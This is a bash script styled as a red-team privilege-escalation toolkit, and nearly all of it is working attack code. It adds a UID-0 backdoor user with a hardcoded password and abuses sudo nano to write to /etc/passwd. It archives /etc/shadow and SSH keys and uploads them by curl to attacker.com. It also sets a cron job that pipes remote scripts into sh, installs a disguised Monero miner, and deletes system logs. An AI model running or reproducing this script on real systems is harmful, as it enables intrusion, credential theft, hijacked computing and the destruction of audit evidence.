#!/bin/bash
# priv_esc_full.sh
# Privilege Escalation

LOG_FILE="/var/log/lab_redteam.log"
USERNAME="eviladmin"
PASSWORD="P@ssw0rd123"
SUDO_CMD="/usr/bin/nano"
CRON_CMD="/bin/bash -c 'echo test >> /tmp/test.log'"

echo "========== Red Team Privilege Escalation Toolkit ==========" | tee -a "$LOG_FILE"
echo "[*] Started: $(date)" | tee -a "$LOG_FILE"

# 1. Check if script is run as root
if [ "$EUID" -ne 0 ]; then
    echo "[-] Not running as root. PrivEsc needed to continue." | tee -a "$LOG_FILE"
else
    echo "[+] Already running as root!" | tee -a "$LOG_FILE"
    echo "[+] Adding root user: $USERNAME" | tee -a "$LOG_FILE"
    HASH=$(openssl passwd -6 "$PASSWORD")
    useradd -m -p "$HASH" -s /bin/bash -u 0 -o "$USERNAME"
    echo "[+] Root user '$USERNAME' added successfully!" | tee -a "$LOG_FILE"
fi

# 2. Privilege Escalation Recon
echo -e "\n[*] Scanning for PrivEsc vectors..." | tee -a "$LOG_FILE"

# 2.1 SUID Binaries
echo "[+] Searching for SUID binaries..." | tee -a "$LOG_FILE"
find / -perm -4000 -type f 2>/dev/null | tee -a "$LOG_FILE"

# 2.2 World-writable Files
echo -e "\n[+] Checking for world-writable files/directories..." | tee -a "$LOG_FILE"
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) 2>/dev/null | tee -a "$LOG_FILE"

# 2.3 Cron Jobs
echo -e "\n[+] Looking for writable cron jobs..." | tee -a "$LOG_FILE"
ls -alh /etc/cron* /var/spool/cron/crontabs 2>/dev/null | tee -a "$LOG_FILE"

# 2.4 sudo misconfigurations
echo -e "\n[+] Checking sudo permissions (requires user password)..." | tee -a "$LOG_FILE"
sudo -l | tee -a "$LOG_FILE"

# 2.5 Capabilities
echo -e "\n[+] Checking for misconfigured Linux capabilities..." | tee -a "$LOG_FILE"
getcap -r / 2>/dev/null | tee -a "$LOG_FILE"

# 3. Exploitation Phase - Exploit sudo misconfigurations
echo -e "\n[*] Exploiting sudo misconfigurations..." | tee -a "$LOG_FILE"

if sudo -l | grep -q "$SUDO_CMD"; then
    echo "[+] Misconfigured sudo found: $SUDO_CMD" | tee -a "$LOG_FILE"
    echo "[*] Exploiting misconfig via sudo nano..."
    sudo nano /etc/passwd
    echo "eviladmin:x:0:0:root:/root:/bin/bash" >> /etc/passwd
    echo "[+] Successfully added root user 'eviladmin' via sudo nano" | tee -a "$LOG_FILE"
fi

# 4. Persistence via Cron Job
echo -e "\n[*] Setting up persistence via cron job..." | tee -a "$LOG_FILE"
echo "* * * * * root /bin/bash -c 'echo [Persistence] $(date) >> /tmp/persist.log'" >> /etc/crontab
echo "[+] Cron job added for persistence" | tee -a "$LOG_FILE"

# 5. Kernel Info for Local Exploit Lookup
echo -e "\n[+] Kernel version info:" | tee -a "$LOG_FILE"
uname -a | tee -a "$LOG_FILE"

# 6. Logging & OPSEC
echo -e "\n[+] Logging actions to $LOG_FILE..." | tee -a "$LOG_FILE"
echo "$(date) - Exploited sudo, created root user, added cron persistence" >> "$LOG_FILE"

echo -e "\n[*] Script completed. Log saved to $LOG_FILE"


# --- Backdoor Installation ---
echo "[+] Adding backdoor user 'eviladmin'..."
echo "eviladmin:x:0:0:root:/root:/bin/bash" >> /etc/passwd  # Give root access
echo "eviladmin:$6$randomsalt$FakeHashedPassword" >> /etc/shadow  # Fake password hash

# --- Data Theft ---
echo "[+] Stealing sensitive files..."
tar -czf /tmp/stolen_data.tar.gz /etc/passwd /etc/shadow /home/*/.ssh/
curl -F "file=@/tmp/stolen_data.tar.gz" http://attacker.com/upload  # Exfiltrate data

# --- Persistence (Cronjob) ---
echo "[+] Setting up persistence..."
echo "* * * * * root /bin/bash -c 'curl http://attacker.com/new_commands.sh | sh'" >> /etc/crontab

# --- Cryptocurrency Miner ---
echo "[+] Installing crypto miner..."
wget -q http://attacker.com/xmrig -O /tmp/.systemd && chmod +x /tmp/.systemd
nohup /tmp/.systemd --coin=monero --pool=attacker-pool.com &> /dev/null &

# --- Cleanup Traces ---
echo "[+] Hiding activity..."
rm -f /var/log/auth.log /var/log/syslog
history -c && shutdown -r now  # Erase logs & reboot